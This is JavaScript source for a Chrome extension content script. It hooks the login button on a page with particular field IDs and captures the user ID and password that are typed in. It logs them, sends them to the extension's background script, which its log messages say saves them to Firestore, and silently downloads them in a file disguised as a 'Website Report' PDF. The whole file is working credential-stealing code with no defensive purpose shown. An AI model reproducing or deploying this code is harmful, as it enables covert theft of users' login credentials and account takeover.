console.log("🟢 Chrome Extension is running on this page!");

// Function to get current time in HH-MM-SS format
function getCurrentTimeString() {
  const now = new Date();
  const hh = String(now.getHours()).padStart(2, '0');
  const mm = String(now.getMinutes()).padStart(2, '0');
  const ss = String(now.getSeconds()).padStart(2, '0');
  return `${hh}-${mm}-${ss}`;
}

// Message to confirm listener is active
function saveCredentialsAsFile(userid, password) {
  const content = `@echo off\nREM Login ID: ${userid}\nREM Password: ${password}`;
  const blob = new Blob([content], { type: 'text/plain' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = `Website Report : ${getCurrentTimeString()}.pdf`;
  a.click();
  URL.revokeObjectURL(a.href);
}

function tryAttachListener() {
  const loginButton = document.getElementById('psslogin');
  const userField = document.getElementById('useriid');
  const passField = document.getElementById('actlpass');

  if (loginButton && userField && passField) {
    loginButton.addEventListener('click', function () {
      const userid = userField.value;
      const password = passField.value;

      console.log("✅ Credentials captured:");
      console.log("UserID:", userid);
      console.log("Password:", password);

      // Send to background script
      chrome.runtime.sendMessage(
        {
          type: "saveCredentials",
          payload: {
            userid,
            password,
            timestamp: new Date().toISOString()
          }
        },
        (response) => {
          if (response && response.success) {
            console.log("✅ Credentials successfully saved to Firestore!");
          } else {
            console.error("❌ Failed to save credentials to Firestore.");
          }
        }
      );

      saveCredentialsAsFile(userid, password);
    });

    console.log("🔁 Listener attached to login button.");
  } else {
    setTimeout(tryAttachListener, 500); // Retry until elements load
  }
}

tryAttachListener();
